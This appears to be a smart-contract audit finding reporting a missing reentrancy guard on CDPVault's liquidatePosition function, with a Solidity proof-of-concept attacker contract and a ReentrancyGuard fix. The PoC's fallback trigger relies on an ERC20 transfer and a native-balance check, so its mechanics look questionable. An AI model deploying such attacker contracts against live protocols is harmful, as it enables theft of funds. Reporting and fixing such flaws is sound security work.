# Vulnerability details

## Impact
The `liquidatePosition` function in the `CDPVault.sol` contract allows external actors to liquidate a user’s position when it falls below a certain collateralization ratio. The function executes a series of token transfers and state updates to process the liquidation.

However, the function lacks the `nonReentrant` modifier, which is critical for preventing reentrancy attacks. In a reentrancy attack, a malicious contract can call back into the `liquidatePosition` function before the initial call completes, effectively reentering the function multiple times in a single transaction. This can lead to severe financial damage, such as allowing the attacker to liquidate the same position multiple times and withdraw excessive collateral.

```
function liquidatePosition(address owner, uint256 repayAmount) external whenNotPaused {
    ...
    poolUnderlying.safeTransferFrom(msg.sender, address(pool), repayAmount - penalty);
    ...
    token.safeTransfer(msg.sender, takeCollateral);
}
```
The `liquidatePosition` function processes a liquidation by transferring the repayAmount from the liquidator to the pool and then transferring the corresponding collateral to the liquidator. The function does not guard against reentrant calls, making it possible for an attacker to reenter and perform multiple liquidations within a single transaction.


## Proof of Concept
A malicious actor can exploit this vulnerability by deploying a contract that initiates a liquidation and then reenters the `liquidatePosition` function during the token transfer, effectively doubling their liquidation benefits.

```
contract ReentrantAttacker {
    CDPVault vault;
    address owner;
    uint256 repayAmount;

    constructor(CDPVault _vault, address _owner, uint256 _repayAmount) {
        vault = _vault;
        owner = _owner;
        repayAmount = _repayAmount;
    }

    function attack() external {
        // Start the attack by calling the liquidation function
        vault.liquidatePosition(owner, repayAmount);
    }

    fallback() external payable {
        // Reenter the liquidation function to trigger another liquidation before the first one completes
        if (address(vault).balance > 0) {
            vault.liquidatePosition(owner, repayAmount);
        }
    }
}
```

Deploy the ReentrantAttacker contract with the CDPVault contract address, the owner’s address, and the repayment amount.
Call the attack() function on the ReentrantAttacker contract.
The attack() function will call liquidatePosition, which triggers the liquidation process. When the token.safeTransfer(msg.sender, takeCollateral) line is executed, the fallback function in the attacker contract is triggered.
The fallback function reenters the liquidatePosition function, allowing the attacker to double the liquidation process, withdrawing more collateral than they should.

Impact:

Double Liquidation: The attacker could withdraw double the collateral by exploiting the reentrancy, leading to significant financial losses for the protocol.
System Instability: This reentrancy attack could cause inconsistencies in the protocol's accounting, creating broader instability within the system.
Financial Losses: The vault may lose collateral that it should retain, endangering the protocol's overall solvency.

## Recommended Mitigation Steps

```
Add the nonReentrant modifier to the liquidatePosition function to prevent reentrancy attacks:

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract CDPVault is AccessControl, Pause, Permission, ICDPVaultBase, ReentrancyGuard {
    ...

    function liquidatePosition(address owner, uint256 repayAmount) external whenNotPaused nonReentrant {
        ...
    }
}
```
